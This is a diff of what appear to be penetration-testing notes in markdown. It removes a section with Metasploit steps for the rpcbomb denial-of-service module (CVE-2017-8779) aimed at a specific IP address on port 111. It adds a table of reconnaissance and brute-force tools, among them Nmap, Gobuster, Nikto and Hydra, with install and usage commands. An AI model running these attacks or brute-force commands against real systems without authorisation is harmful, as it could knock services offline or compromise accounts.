@@ -11,18 +11,16 @@ First Terminal
 Second terminal
 `proxychains <program>`
 
-## CVE-2017-8779
+## Tools and Softwares
 
-### RPCbind port 
-
-Open the Metasploit framework and type 'use auxiliary/dos/rpc/rpcbomb'
-set RHOSTS to 149.56.38.19 and RPORT to 111
-Type 'exploit'
-
-### Impact
-
-An attacker could use this vulnerability to trigger large unfreed memory allocations on the system leading to a remote Denial of Service.
-
+| Tools      | Purpose                                  | How to Install                    | Usage                                                      |
+|------------|------------------------------------------|-----------------------------------|------------------------------------------------------------|
+| Nmap       | Network scanning and host discovery      | $ sudo apt-get install nmap       | $ nmap -p <port> <rhost>                                   |
+| Gobuster   | Web directory and DNS brute-forcing      | $ go get github.com/OJ/gobuster   | $ gobuster dir -u <rhost> -w <wordlist>                    |
+| Enum4linux | Windows and Samba enumeration            | $ sudo apt-get install enum4linux | $ enum4linux <rhost>                                       |
+| Whatweb    | Web application fingerprinting           | $ gem install whatweb             | $ whatweb <rhost>                                          |
+| Nikto      | Web server vulnerability scanner         | $ sudo apt-get install nikto      | $ nikto -h <rhost>                                         |
+| Hydra      | Password cracking and brute-forcing tool | $ sudo apt-get install hydra      | $ hydra -l <username> -P <password-list> <rhost> <service> |
 
 ## References
 
